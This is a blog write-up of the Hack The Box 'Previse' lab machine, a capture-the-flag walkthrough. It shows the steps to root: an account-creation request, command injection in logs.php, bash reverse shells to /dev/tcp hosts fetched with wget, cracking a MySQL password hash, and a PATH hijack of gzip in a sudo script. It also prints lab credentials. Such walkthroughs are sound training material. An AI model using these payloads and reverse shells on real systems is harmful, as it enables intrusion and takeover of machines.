---
layout: post
title: HTB Previse  
subtitle: Easy Box
thumbnail-img: /assets/img/previse.png
tags: [HTB]
---

# Previse
![Explore](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/previse.png)


| Name | Previse |
| :------ |:--- |
| OS | Linux |
| RELEASE DATE | 7 Aug 2021 |
| DIFFICULTY | Easy |

# Portscan
IP: 10.10.11.104
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA)
|   256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA)
|_  256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-title: Previse Login
|_Requested resource was login.php
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```


# Port 80 http

The first thing to do is see if we can fuzz any files or directories, I'll use ffuf to do this.
```
┌──(root💀kali)-[~/htb/previse]
└─# ffuf -u http://10.10.11.104/FUZZ -w /opt/SecLists/Discovery/Web-Content/raft-small-directories.txt -c -t 200 -e .php 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.104/FUZZ
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/Web-Content/raft-small-directories.txt
 :: Extensions       : .php 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

index.php               [Status: 302, Size: 2801, Words: 737, Lines: 72]
js                      [Status: 301, Size: 309, Words: 20, Lines: 10]
config.php              [Status: 200, Size: 0, Words: 1, Lines: 1]
files.php               [Status: 302, Size: 4914, Words: 1531, Lines: 113]
accounts.php            [Status: 302, Size: 3994, Words: 1096, Lines: 94]
nav.php                 [Status: 200, Size: 1248, Words: 462, Lines: 32]
header.php              [Status: 200, Size: 980, Words: 183, Lines: 21]
footer.php              [Status: 200, Size: 217, Words: 10, Lines: 6]
css                     [Status: 301, Size: 310, Words: 20, Lines: 10]
status.php              [Status: 302, Size: 2968, Words: 749, Lines: 75]
login.php               [Status: 200, Size: 2224, Words: 486, Lines: 54]
logs.php                [Status: 302, Size: 0, Words: 1, Lines: 1]
server-status           [Status: 403, Size: 277, Words: 20, Lines: 10]
.php                    [Status: 403, Size: 277, Words: 20, Lines: 10]
                        [Status: 302, Size: 2801, Words: 737, Lines: 72]
download.php            [Status: 302, Size: 0, Words: 1, Lines: 1]
logout.php              [Status: 302, Size: 0, Words: 1, Lines: 1]

```

After taking a look at the requests `/accounts.php` was showing me the contents of its page before redirecting to /login.php. I sent the request to Repeater and could see the HTML of the page. On the page I could see an account creation form, I can use this to create a post request to create an account.  

```html
        <form role="form" method="post" action="accounts.php">
            <div class="uk-margin">
                <div class="uk-inline">
                    <span class="uk-form-icon" uk-icon="icon: user"></span>
                    <input type="text" name="username" class="uk-input" id="username" placeholder="Username">
                </div>
            </div>
            <div class="uk-margin">
                <div class="uk-inline">
                    <span class="uk-form-icon" uk-icon="icon: lock"></span>
                    <input type="password" name="password" class="uk-input" id="password" placeholder="Password">
                </div>
            </div>
            <div class="uk-margin">
                <div class="uk-inline">
                    <span class="uk-form-icon" uk-icon="icon: lock"></span>
                    <input type="password" name="confirm" class="uk-input" id="confirm" placeholder="Confirm Password">
                </div>
            </div>
            <button type="submit" name="submit" class="uk-button uk-button-default">

```

I started off by getting the post request to `/login.php` as my template then I made the following changes.
1. Change the post & Referer to `/accounts.php`
2. Craft my arguments
	1. The first argument was "username" 
	2. The second was "password"
	3. The third was "confirm"
	4. The fourth was "submit" (we can leave this blank)
3. change the Content-Length to the appropriate length 

```
POST /accounts.php HTTP/1.1
Host: 10.10.11.104
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 59
Origin: http://10.10.11.104
Connection: close
Referer: http://10.10.11.104/accounts.php
Cookie: PHPSESSID=aj9nus42p8d3papn711r6hjqq3
Upgrade-Insecure-Requests: 1

username=zonifer&password=password&confirm=password&submit=
```

After we send the request we can login as our user!

# WWW Shell
I found some sql creds inside config.php `root:mySQL_p@ssw0rd!:)` and a database of `previse` this will probably be useful later

Looking at the php code I found that there was a line inside logs.php that was vulnerable. Its vulnerable because its taking the argument "delim" and executing it on the system. We can add `;id` to the correct argument to run the `id` command as well here is a good article to read more about command injection https://www.stackhawk.com/blog/php-command-injection/

`$output = exec("/usr/bin/python /opt/scripts/log_process.py {$_POST['delim']}");` 

We can modify the request to get code execution. I tried executing a bash reverse shell but because of some of the characters it did not work. So I put it into a file and copied it onto the box then executed it. 

rev.sh
`bash -i >& /dev/tcp/YOURIP/9002 0>&1`

Set up http python server
```
┌──(root💀kali)-[~/htb/previse]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Get rev.sh onto the machine
```
POST /logs.php HTTP/1.1
Host: 10.10.11.104
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 37
Origin: http://10.10.11.104
Connection: close
Referer: http://10.10.11.104/file_logs.php
Cookie: PHPSESSID=aj9nus42p8d3papn711r6hjqq3
Upgrade-Insecure-Requests: 1

delim=comma%26wget+YOURIP/rev.sh
```

Set up a listener for shell
`nc -lvnp 9002`  

Execute rev.sh
```
POST /logs.php HTTP/1.1
Host: 10.10.11.104
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 25
Origin: http://10.10.11.104
Connection: close
Referer: http://10.10.11.104/file_logs.php
Cookie: PHPSESSID=aj9nus42p8d3papn711r6hjqq3
Upgrade-Insecure-Requests: 1

delim=comma%26bash+rev.sh
```

We get a connection
```
┌──(root💀kali)-[~/htb/previse]                                                                                                                                                                                                              
└─# nc -lvnp 9002                                                                                                                                                                                                                        1 ⨯ 
listening on [any] 9002 ...                              
connect to [10.10.14.13] from (UNKNOWN) [10.10.11.104] 35510                                                          
bash: cannot set terminal process group (1429): Inappropriate ioctl for device                                        
bash: no job control in this shell
www-data@previse:/var/www/html$
```

# User
Lets connect to mysql and see if we can find any creds. But first we need to upgrade our shell
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

Then we can connect to mysql
```
www-data@previse:/var/www/html$ mysql -u root -p 
mysql -u root -p 
Enter password: mySQL_p@ssw0rd!:)  
```

We find a database called "previse" and a table called "accounts" in that table we can see a hash for the user "m4lwhere"

```
mysql> select * from accounts
select * from accounts
    -> ;
;
+----+----------+------------------------------------+---------------------+
| id | username | password                           | created_at          |
+----+----------+------------------------------------+---------------------+
|  1 | m4lwhere | $1$🧂llol$DQpmdvnb7EeuO6UaqRItf. | 2021-05-27 18:18:36 |
|  2 | zonifer  | $1$🧂llol$79cV9c1FNnnr7LcfPFlqQ0 | 2021-11-02 01:57:36 |
+----+----------+------------------------------------+---------------------+
```

We can crack it with hashcat. I did this on my host machine that has a GPU to speed things up
`PS C:\hashcat-6.2.3> ./hashcat.exe -m 500 ..\hash.txt ..\rockyou.txt`

Password cracked `m4lwhere:ilovecody112235!`
`$1$≡ƒºéllol$DQpmdvnb7EeuO6UaqRItf.:ilovecody112235!`

We can now SSH into the machine as m4lwhere and get our user flag

# Root

Running `sudo -l` shows that we can run one command as root
```
m4lwhere@previse:~$ sudo -l
[sudo] password for m4lwhere: 
User m4lwhere may run the following commands on previse:
    (root) /opt/scripts/access_backup.sh
```

Lets `cat` the file and see what its doing
```
m4lwhere@previse:~$ cat /opt/scripts/access_backup.sh
#!/bin/bash

# We always make sure to store logs, we take security SERIOUSLY here

# I know I shouldnt run this as root but I cant figure it out programmatically on my account
# This is configured to run with cron, added to sudo so I can run as needed - we'll fix it later when there's time

gzip -c /var/log/apache2/access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_access.gz
gzip -c /var/www/file_access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_file_access.gz
```

Its using `gzip` to backup two files. But notice it uses `gzip` and not `/usr/bin/gzip` we can hijack `gzip` because it uses a relative path instead of an absolute path. 

Lets make our version of gzip
```
vim gzip

#!/bin/bash
bash -i >& /dev/tcp/10.10.14.13/9003 0>&1
```

Then we need to make it executable
`chmod +x gzip`

Next, we will modify our Environment Path to include our directory that our malicious `gzip` is in.
`export PATH=/home/m4lwhere:$PATH`

Set up a listener on kali
`nc -lvnp 9003`

Execute the script
`sudo /opt/scripts/access_backup.sh`

Then we get a connect back as root!
```
root@previse:/root# id
id
uid=0(root) gid=0(root) groups=0(root)
```

